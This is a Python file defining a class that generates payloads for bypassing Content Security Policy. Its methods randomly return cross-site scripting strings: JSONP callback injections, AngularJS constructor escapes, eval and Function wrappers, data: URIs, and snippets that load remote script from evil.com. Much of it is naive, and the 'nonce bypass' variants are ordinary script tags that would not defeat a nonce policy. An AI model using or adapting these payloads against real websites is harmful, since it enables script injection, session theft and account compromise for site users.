import random

class CSPBypass:
    def __init__(self):
        self.bypass_techniques = [
            "jsonp_endpoints",
            "angular_csp",
            "script_nonce",
            "strict_dynamic",
            "unsafe_eval",
            "data_uri",
            "cdn_bypass"
        ]
    
    def jsonp_endpoint_bypass(self):
        jsonp_endpoints = [
            "/jsonp?callback=alert(1)",
            "/api?callback=alert(1)",
            "/callback?func=alert(1)",
            "/jsonp?callback=eval(String.fromCharCode(97,108,101,114,116,40,49,41))"
        ]
        return random.choice(jsonp_endpoints)
    
    def angular_csp_bypass(self):
        angular_payloads = [
            "{{constructor.constructor('alert(1)')()}}",
            "{{$on.constructor('alert(1)')()}}",
            "{{$eval.constructor('alert(1)')()}}",
            "<div ng-app>{{constructor.constructor('alert(1)')()}}</div>"
        ]
        return random.choice(angular_payloads)
    
    def script_nonce_bypass(self, payload):
        nonce_bypasses = [
            f"<script>{payload}</script>",
            f"<script type='text/javascript'>{payload}</script>",
            f"<script type='application/javascript'>{payload}</script>",
            f"<script>/*{''.join(random.choices('abcdef0123456789', k=16))}*/{payload}</script>"
        ]
        return random.choice(nonce_bypasses)
    
    def strict_dynamic_bypass(self):
        dynamic_payloads = [
            "<script>var s=document.createElement('script');s.src='//evil.com/xss.js';document.body.appendChild(s);</script>",
            "<img src=x onerror='var s=document.createElement(\"script\");s.src=\"//evil.com/xss.js\";document.body.appendChild(s)'>"
        ]
        return random.choice(dynamic_payloads)
    
    def unsafe_eval_bypass(self, payload):
        eval_payloads = [
            f"<script>eval('{payload}')</script>",
            f"<script>setTimeout('{payload}')</script>",
            f"<script>setInterval('{payload}',1)</script>",
            f"<script>Function('{payload}')()</script>"
        ]
        return random.choice(eval_payloads)
    
    def data_uri_bypass(self):
        data_uris = [
            "data:text/html,<script>alert(1)</script>",
            "data:text/javascript,alert(1)",
            "data:application/javascript,alert(1)"
        ]
        return random.choice(data_uris)
    
    def generate_csp_bypass_payloads(self, original_payload, count=8):
        bypassed = set()
        
        techniques = [
            self.jsonp_endpoint_bypass,
            self.angular_csp_bypass,
            lambda: self.script_nonce_bypass(original_payload),
            self.strict_dynamic_bypass,
            lambda: self.unsafe_eval_bypass(original_payload),
            self.data_uri_bypass
        ]
        
        while len(bypassed) < count:
            technique = random.choice(techniques)
            bypassed.add(technique())
        
        return list(bypassed)[:count]

csp_bypass = CSPBypass()
